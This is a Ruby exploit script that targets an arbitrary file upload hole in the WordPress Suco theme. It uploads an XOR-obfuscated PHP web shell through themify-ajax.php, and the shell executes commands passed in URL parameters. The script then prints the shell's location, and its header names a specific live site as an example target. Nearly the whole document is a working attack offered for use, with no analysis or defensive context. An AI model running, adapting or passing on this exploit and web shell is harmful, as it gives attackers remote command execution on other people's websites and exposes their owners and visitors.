#!/usr/bin/env ruby
#
# Wordpress Suco Themes Arbitrary File Upload
# By: Hood3dRob1n
#
# EX: http://www.villa-niko.com/
#
# Arbitrary File Upload (It pretty much eats anything we throw at it):
# http://www.site.com/wp-content/themes/suco/themify/themify-ajax.php?upload=1
#
# Find Shell after upload:
# http://www.site.com/wp-content/themes/suco/uploads/shell.php
#

require 'rubygems'
require 'curb'

TARGET = ARGV[0].strip.chomp unless ARGV[0].nil?
SHELL = ARGV[1]

if ARGV[0].nil?
  puts "\nMissing Arguments!\n"
  puts "Usage: #{$0} [TARGET] [SHELL2UPLOAD]\n\n"
  exit 666;
end

if not SHELL.nil? and File.exists?(SHELL.strip.chomp)
  shell=SHELL.strip.chomp
else
  shell='./detour.php'
  shell_code = "<?
# http://localhost/s1.php?_=shell_exec&__=id
$_=\"{\"; #XOR char
$_=($_^\"<\").($_^\">;\").($_^\"/\"); #XOR = GET
?>
<?=${'_'.$_}[\"_\"](${'_'.$_}[\"__\"]);?>"
  f=File.open(shell, 'w+')
  f.puts shell_code
  f.close
end

# Create new Curl Instance
if TARGET =~ /http/
  target = TARGET.sub(/\/$/, '')
else
  target = "http://#{TARGET.sub(/\/$/, '')}"
end
target += '/wp-content/themes/suco/themify/themify-ajax.php?upload=1'
findme = target.sub('themify/themify-ajax.php?upload=1', "uploads/#{shell.split('/')[-1]}")

# Upload File to Target
c = Curl::Easy.new(target) do |curl|
  curl.ssl_verify_peer = false
  curl.max_redirects = 3
  curl.timeout = 30
  curl.verbose = true
  curl.useragent = 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'
  curl.multipart_form_post = true
  curl.on_success {|easy| puts "\n\nFile #{shell} has been uploaded!\n\nCheck #{findme}\n\n" }
  begin
    curl.http_post(Curl::PostField.file('Filedata', shell))
  rescue => e
    puts "\n\nEpic Failure Uploading Payload File!\n\t=> #{e}\n\n"
  end
end
File.delete('./detour.php') if File.exists?('./detour.php')
# EOF
